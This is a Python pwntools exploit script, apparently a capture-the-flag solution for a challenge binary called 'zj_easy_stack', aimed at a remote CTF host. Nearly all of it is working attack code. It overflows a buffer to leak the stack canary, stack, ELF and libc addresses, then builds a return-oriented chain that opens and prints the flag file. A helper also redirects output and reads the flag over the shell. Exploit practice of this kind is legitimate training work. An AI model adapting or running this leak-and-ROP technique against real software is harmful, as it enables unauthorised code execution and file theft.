# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './zj_easy_stack'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.31.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com'
    port = '54501'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l64_elf = lambda            : u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    payload = 'a'*0x100 + '\xf0'
    sla('size' , 0x100)
    # dbg()
    # dbg('*$rebase(0x0000000000001488)')
    sa('sentence' ,  payload)
    read_bass = l64()
    stack = l64()
    p.recv(0x4)
    canary =u64(p.recv(7).rjust(8 , '\x00'))
    leak = l64()
    elf_addr = l64_elf() - 0x137B

    lg('read_bass' , read_bass)
    lg('stack',stack)
    lg('canary' , canary)
    lg('leak' , leak)
    lg('elf_addr' , elf_addr)

    __libc_start_main = leak - 243
    libc.address =__libc_start_main - libc.sym['__libc_start_main']
    pop_rdi_ret = libc.search(asm('pop rdi;ret')).next()
    ret = libc.search(asm('ret')).next()
    bin_sh = libc.search('/bin/sh').next()
    system_addr = libc.sym['system']

    lg('system_addr' , system_addr)
    # print(canary)
    
    arry_stack = stack - 0x210
    lg('arry_stack' , arry_stack)
    sla('size' , 0x100)

    offset = 0x100 - (read_bass - arry_stack) - 0x10
    lg('offset',offset)

    payload = 'a'*(offset + 0x10 ) + flat( arry_stack - 0x100 , 0x100 , 0 , 1)
    # dbg('*$rebase(0x0000000000001488)')
    sa('sentence' ,  payload.ljust( 0x101, 'c'))

    sla('size' , 0x100)
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm(' ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    
    flag_addr = arry_stack + 0xf0 - 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0xf0,'\x00') + 'flag\x00'
    # len chain 0x80
    
    # dbg('free')
    # dbg('*$rebase(0x00000000000131D)')
    # payload = 'a'*0xb8 + flat(elf_addr + 0x130a , 0 , 0x100 ) + p8( (arry_stack - 0x100 - 0x10)&0xff) + p8((((arry_stack - 8)&0xff00)>>8 ) ) + p64(pop_rdi_ret) + p64(system_addr)
    payload = 'a'*0xb8 + flat(elf_addr + 0x130a , 0 , 0x200 ) + p64(arry_stack - 0x100) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xe8) + p64(pop_rdi_ret) + chain
    sa('sentence' , payload.ljust( 0x201, 'b'))

    # dbg()



    
    ''

attack()
# p.success(getShell())
p.interactive()

'''
@File    :   zj_easy_stack.py
@Time    :   2021/10/30 08:35:26
@Author  :   Niyah 
'''
